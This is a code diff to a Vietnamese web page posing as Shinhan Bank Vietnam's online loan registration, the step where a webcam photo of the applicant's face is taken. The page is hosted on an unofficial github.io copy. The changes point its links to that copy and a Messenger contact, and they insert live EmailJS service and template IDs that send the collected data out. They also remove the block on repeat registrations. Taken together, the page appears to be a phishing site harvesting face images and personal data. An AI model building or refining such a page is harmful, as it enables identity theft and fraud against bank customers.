@@ -25,9 +25,19 @@
         .navbar-brand img {
             height: 50px;
         }
+        .navbar-nav {
+            display: flex;
+            flex-wrap: nowrap;
+            overflow-x: auto;
+            white-space: nowrap;
+            -webkit-overflow-scrolling: touch;
+        }
         .navbar-nav .nav-link {
             color: white !important;
             transition: color 0.3s;
+            padding: 8px 10px;
+            font-size: 0.9rem;
+            margin: 0 5px;
         }
         .navbar-nav .nav-link:hover {
             color: var(--accent-color) !important;
@@ -96,6 +106,23 @@
             margin-top: 10px;
             border-radius: 5px;
         }
+        .webcam-container {
+            position: relative;
+            width: 320px;
+            height: 240px;
+            margin: 0 auto;
+        }
+        .face-overlay {
+            position: absolute;
+            top: 20%;
+            left: 20%;
+            width: 60%;
+            height: 60%;
+            border: 2px dashed #ffffff;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 10;
+        }
         .btn-primary {
             background-color: var(--primary-color);
             border-color: var(--primary-color);
@@ -135,20 +162,22 @@
             display: none;
             margin-left: 8px;
         }
-        .block-message {
-            background: #fff3cd;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            margin: 20px 0;
-            color: #856404;
-        }
         .modal-body img {
             max-width: 100%;
         }
         @media (max-width: 768px) {
             .navbar-brand img {
                 height: 40px;
+            }
+            .navbar-nav {
+                flex-wrap: nowrap;
+                overflow-x: auto;
+                padding-bottom: 10px;
+            }
+            .navbar-nav .nav-link {
+                font-size: 0.8rem;
+                padding: 6px 8px;
+                margin: 0 3px;
             }
             .step-indicator {
                 display: none;
@@ -162,13 +191,19 @@
             .upload-section h3 {
                 font-size: 1rem;
             }
-            .btn-primary, .btn-secondary {
+            .btn-primary, .btn-secondary, .btn-outline-secondary {
                 width: 100%;
                 margin-bottom: 10px;
             }
-            #webcam {
+            .webcam-container, #webcam {
                 width: 100% !important;
                 height: auto !important;
+            }
+            .face-overlay {
+                top: 15%;
+                left: 15%;
+                width: 70%;
+                height: 70%;
             }
         }
     </style>
@@ -183,14 +218,14 @@
                 </button>
                 <div class="collapse navbar-collapse" id="navbarNav">
                     <ul class="navbar-nav ms-auto">
-                        <li class="nav-item"><a class="nav-link" href="#">GIỚI THIỆU</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">LỢI ÍCH</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">GIẤY TỜ CẦN THIẾT</a></li>
-                        <li class="nav-item"><a class="nav-link active" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">XEM KẾT QUẢ</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">ĐIỀU KHOẢN SỬ DỤNG</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">LIÊN HỆ</a></li>
-                        <li class="nav-item"><a class="nav-link" href="#">MESSENGER</a></li>
+                       <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆU</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/tham-chieu.html">LỢI ÍCH</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-vay.html">GIẤY TỜ CẦN THIẾT</a></li>
+                        <li class="nav-item"><a class="nav-link active" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-tien-gui.html">XEM KẾT QUẢ</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">ĐIỀU KHOẢN SỬ DỤNG</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">LIÊN HỆ</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">MESSENGER</a></li>
                     </ul>
                 </div>
             </div>
@@ -203,10 +238,6 @@
             <div class="step">1. Nhập thông tin</div>
             <div class="step">2. Xác thực và xử lý</div>
             <div class="step active">3. Hoàn thành</div>
-        </div>
-
-        <div id="blockMessage" class="block-message" style="display: none;">
-            <p><strong>Thông báo:</strong> Đã có hồ sơ đăng ký tại Ngân hàng Shinhan. Vui lòng liên hệ hỗ trợ để biết thêm chi tiết.</p>
         </div>
 
         <div id="faceVerificationContent">
@@ -222,7 +253,10 @@
                     </h2>
                     <div id="webcamSection" class="accordion-collapse collapse show" data-bs-parent="#faceAccordion">
                         <div class="accordion-body">
-                            <div id="webcam" style="width: 320px; height: 240px; margin: 0 auto;"></div>
+                            <div class="webcam-container">
+                                <div id="webcam" style="width: 320px; height: 240px;"></div>
+                                <div class="face-overlay" id="faceOverlay"></div>
+                            </div>
                             <p id="webcamStatus" class="text-center mt-2">Đang chờ khuôn mặt...</p>
                             <p id="webcamError" class="error text-center"></p>
                             <p id="webcamSuccess" class="success-message text-center">Ảnh khuôn mặt đã được chụp!</p>
@@ -257,10 +291,9 @@
             <div class="d-flex justify-content-between mt-3 flex-column flex-md-row">
                 <div class="mb-2 mb-md-0">
                     <a href="step2.html" class="btn btn-outline-secondary">QUAY LẠI</a>
-                    <button type="button" class="btn btn-outline-danger ms-2" onclick="resetProgress()">XÓA TIẾN TRÌNH</button>
                 </div>
                 <button class="btn btn-primary position-relative" onclick="nextStep()">
-                    BƯỚC KẾ TIẾP
+                    TIẾP TỤC
                     <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
                 </button>
             </div>
@@ -288,18 +321,19 @@
     <footer class="bg-light py-3 mt-4">
         <div class="container text-center">
             <div class="footer-links">
-                <a href="#">Chính sách bảo mật</a> |
-                <a href="#">Điều khoản sử dụng</a> |
-                <a href="#">Chính sách Cookies</a> |
-                <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
-                <a href="#">Hướng dẫn truy cập web</a> |
-                <a href="#">Sitemap</a>
+               <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
+                <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Chính sách Cookies</a> |
+                <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Miễn khoản từ chối liên kết bên ngoài</a> |
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Hướng dẫn truy cập web</a> |
+                <a href="https://shinhan.com.vn/vi/page/sitemap-2.html">Sitemap</a> |
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Trung tâm bảo mật</a> |
+                <a href="https://online.shinhan.com.vn/global.shinhan">Demo Ngân hàng trực tuyến</a> |
+                <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">Liên hệ</a> |
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/global-shinhan.html">Trang Global Portal</a> |
+                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a>
             </div>
-            <p class="mt-2">
-                Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu
-            </p>
-            <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
-            <p>Ngân hàng Shinhan được quản lý bởi Ngân hàng Nhà nước Việt Nam.</p>
+            <p class="mt-2">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
         </div>
     </footer>
 
@@ -318,16 +352,11 @@
 
         // Check for existing registration and load saved image
         window.onload = function() {
-            if (localStorage.getItem('registered')) {
-                document.getElementById('blockMessage').style.display = 'block';
-                document.getElementById('faceVerificationContent').style.display = 'none';
-                return;
-            }
-
             const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
             if (savedData.step3?.faceImage) {
                 document.getElementById('faceImagePreview').innerHTML = `<img src="${savedData.step3.faceImage}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
                 document.getElementById('faceImageSuccess').style.display = 'block';
+                document.getElementById('faceOverlay').style.display = 'none';
             }
 
             Webcam.attach('#webcam');
@@ -339,12 +368,14 @@
             const errorElement = document.getElementById('webcamError');
             const successElement = document.getElementById('webcamSuccess');
             const previewElement = document.getElementById('faceImagePreview');
+            const faceOverlay = document.getElementById('faceOverlay');
 
             Webcam.snap(function(data_uri) {
                 previewElement.innerHTML = `<img src="${data_uri}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
                 document.getElementById('webcamStatus').textContent = 'Đã chụp ảnh khuôn mặt.';
                 errorElement.textContent = '';
                 successElement.style.display = 'block';
+                faceOverlay.style.display = 'none';
                 saveImage(data_uri);
                 Webcam.reset();
             }, function(error) {
@@ -365,6 +396,7 @@
             document.getElementById('faceImage').value = '';
             document.getElementById('faceImageError').textContent = '';
             document.getElementById('faceImageSuccess').style.display = 'none';
+            document.getElementById('faceOverlay').style.display = 'block';
 
             const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
             if (savedData.step3) {
@@ -439,24 +471,16 @@
                 message: 'Xác minh khuôn mặt của bạn đã hoàn tất. Hồ sơ đang được xét duyệt.'
             };
 
-            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', emailParams)
+            emailjs.send('service_60tgxof', 'template_uhyb8ve', emailParams)
                 .then(() => {
                     console.log('Face verification email sent');
                     spinner.style.display = 'none';
-                    window.location.href = 'step4.html';
+                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
                 }, (error) => {
                     console.error('Email sending failed:', error);
                     alert('Lỗi khi gửi email xác nhận. Vui lòng thử lại.');
                     spinner.style.display = 'none';
                 });
-        }
-
-        function resetProgress() {
-            if (confirm('Bạn có chắc chắn muốn xóa toàn bộ tiến trình?')) {
-                localStorage.removeItem('registrationData');
-                localStorage.removeItem('registered');
-                window.location.href = 'step1.html';
-            }
         }
     </script>
 </body>
